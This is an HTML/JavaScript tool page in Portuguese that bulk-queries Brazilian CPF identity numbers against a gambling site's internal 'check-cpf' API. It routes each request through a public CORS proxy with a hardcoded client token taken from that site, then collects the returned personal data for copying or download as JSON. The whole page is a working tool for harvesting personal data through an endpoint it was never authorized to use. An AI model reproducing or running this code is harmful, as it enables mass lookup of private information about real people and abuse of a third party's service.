<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>Consulta CPF ALL INFO</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
html, body {
  margin: 0;
  padding: 0;
  width: 100%;
  height: 100%;
  overflow: hidden; /* REMOVE qualquer scroll lateral */
}

* {
  box-sizing: border-box;
}

body {
  min-height: 100vh;
  min-width: 100vw;

  background-image: url("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQFGr8LY2sUjj_S-CBxpdjoEdwBC7lk-J5PkK-rHlQnWw&s=10");
  background-size: cover;
  background-position: center;
  background-repeat: no-repeat;

  display: flex;
  justify-content: center;
  align-items: center;

  font-family: system-ui, Segoe UI, Arial;
  color: #fff;
}
.container {
    max-width:750px;
    margin:auto;
    background:#151515;
    padding:20px;
    border-radius:8px;
}
textarea, button {
    width:100%;
    padding:12px;
    margin-top:10px;
    border:none;
    border-radius:5px;
    font-size:15px;
}
textarea {
    background:#222;
    color:#fff;
    resize:vertical;
    min-height:120px;
}
button {
    font-weight:bold;
    cursor:pointer;
}
.run {
    background:#00ff88;
    color:#000;
}
.copy {
    background:#0066ff;
    color:#fff;
}
.download {
    background:#ff8800;
    color:#000;
}
pre {
    background:#000;
    margin-top:15px;
    padding:15px;
    max-height:400px;
    overflow:auto;
    font-size:13px;
    border-radius:5px;
}
.status {
    margin-top:10px;
    font-size:13px;
    opacity:0.9;
}
</style>
</head>

<body>

<div class="container">
    <h2>CONSULTAR MAIS INFORMAÇÕES DO CPFs</h2>

    <textarea id="cpfs" placeholder="Digite vários CPFs
Ex:
12582479411
07068093868
11122233344"></textarea>

    <button class="run" onclick="consultar()">CONSULTAR TODOS</button>
    <button class="copy" onclick="copiarTudo()">COPIAR TUDO</button>
    <button class="download" onclick="baixar()">BAIXAR JSON</button>

    <div class="status" id="status"></div>
    <pre id="resultado">[]</pre>
</div>

<script>
/*
  Troque pelo CORS PROXY que você usa
*/
const CORS_PROXY = "https://corsproxy.io/?";

const TOKEN = "eyJjbGllbnRJZCI6Ii91dGlscy9jaGVjay1jcGYvMTI1ODI0Nzk0MTEiLCJ0aW1lc3RhbXAiOjE3Njg3ODU5ODY4MjZ9.db890de410347371a516bb1568c0ec0645324004b04ba3f1aa13897c45141c13";

let respostas = [];

async function consultar() {
    respostas = [];
    document.getElementById('resultado').textContent = '[]';

    let lista = document.getElementById('cpfs').value
        .replace(/[^\d\n, ]/g, '')
        .split(/[\n, ]+/)
        .filter(c => c.length === 11);

    if (!lista.length) {
        alert("Nenhum CPF válido encontrado");
        return;
    }

    for (let i = 0; i < lista.length; i++) {
        const cpf = lista[i];
        document.getElementById('status').textContent =
            `Consultando ${i + 1}/${lista.length} → ${cpf}`;

        const url = CORS_PROXY + encodeURIComponent(
            `https://api.pagol.luckygaming.com.br/utils/check-cpf/${cpf}`
        );

        try {
            const r = await fetch(url, {
                headers: {
                    'Accept': 'application/json, text/plain, */*',
                    'X-Client-Token': TOKEN,
                    'isApp': 'false'
                }
            });

            const t = await r.text();
            let json;

            try {
                json = JSON.parse(t);
            } catch {
                json = { cpf, error: t };
            }

            respostas.push(json);
        } catch (e) {
            respostas.push({ cpf, error: e.toString() });
        }

        document.getElementById('resultado').textContent =
            JSON.stringify(respostas, null, 2);
    }

    document.getElementById('status').textContent =
        `Finalizado • ${respostas.length} CPFs`;
}

function copiarTudo() {
    navigator.clipboard.writeText(
        JSON.stringify(respostas, null, 2)
    );
    alert("Tudo copiado");
}

function baixar() {
    const blob = new Blob(
        [JSON.stringify(respostas, null, 2)],
        { type: "application/json" }
    );

    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = "consulta_cpfs.json";
    a.click();
}
</script>

</body>
</html>
